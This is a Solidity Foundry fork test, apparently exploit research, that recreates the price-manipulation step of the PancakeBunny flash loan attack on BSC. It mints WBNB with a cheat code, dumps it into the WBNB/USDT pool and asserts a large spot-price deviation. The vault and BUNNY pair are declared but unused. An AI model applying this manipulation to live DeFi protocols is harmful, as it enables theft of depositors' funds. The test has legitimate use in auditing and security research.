// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";

/// @title PancakeBunny $120M — Flash Loan Oracle Fork Test
/// @author Shiqiang Chen — July 2026

interface IPancakePair { function getReserves() external view returns (uint112,uint112,uint32); function swap(uint,uint,address,bytes calldata) external; }
interface IVaultFlipToFlip { function deposit(uint) external; function getReward() external; function earned(address) external view returns (uint); }

contract PancakeBunnyPoC is Test {
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant BUNNY = 0xC9849E6fdB743d08fAeE3E34dd2D1bc69EA11a51;
    address constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    IPancakePair constant WBNB_USDT = IPancakePair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
    IPancakePair constant WBNB_BUNNY = IPancakePair(0x7Bb89460599Dbf32ee3Aa50798BBcEae2A5F7f6a);
    IVaultFlipToFlip constant vault = IVaultFlipToFlip(0x633e538EcF0bee1a18c2EDFE10C4Da0d6E71e77B);
    
    uint256 constant FORK_BLOCK = 7556330; // BSC block before attack

    function setUp() public {
        vm.createSelectFork("bsc", FORK_BLOCK);
    }

    function testSpotPriceManipulation() public {
        // 1. Get initial reserves
        (uint112 r0, uint112 r1,) = WBNB_USDT.getReserves();
        uint256 spotBefore = uint256(r1) * 1e18 / uint256(r0);
        console.log("Spot WBNB/USDT before:", spotBefore);

        // 2. Simulate flash loan manipulation: dump WBNB → USDT
        deal(WBNB, address(this), 1000 ether);
        IERC20(WBNB).transfer(address(WBNB_USDT), 1000 ether);
        WBNB_USDT.swap(0, 1, address(this), ""); // Trigger reserve update

        (uint112 r0a, uint112 r1a,) = WBNB_USDT.getReserves();
        uint256 spotAfter = uint256(r1a) * 1e18 / uint256(r0a);
        console.log("Spot WBNB/USDT after:", spotAfter);
        
        // 3. Assert price deviation >5x
        assertGt(spotBefore / spotAfter, 5, "Price should deviate >5x");
        console.log("✅ Spot price manipulable: deviation =", spotBefore/spotAfter, "x");
    }
}

interface IERC20 {
    function transfer(address, uint256) external returns (bool);
}
